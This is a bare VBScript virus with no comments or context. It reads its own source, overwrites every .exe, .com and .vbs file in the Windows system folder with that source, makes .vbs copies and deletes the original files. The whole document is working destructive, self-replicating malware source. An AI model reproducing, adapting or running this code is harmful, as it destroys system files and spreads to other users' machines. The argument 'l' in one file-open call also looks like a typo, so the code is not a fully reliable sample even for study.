Set fso=createobject("scripting.filesystemobject")
set self=fso.opentextfile(wscript.scriptfullname,l)
vbscopy=self.readall
set folder=fso.getfolder("c:\WINDOWS")
set files=folder.files
for each file in files
ext=fso.GetExtensionName(file)
ext=lcase(ext)
if ext="exe" or ext="com" or ext="vbs" then
Set f = fso.GetFile(file)
set ap=fso.opentextfile(f.path,2,1)
ap.write vbscopy
ap.close
f.copy(f.path & ".vbs")
f.delete(1)
end if
next
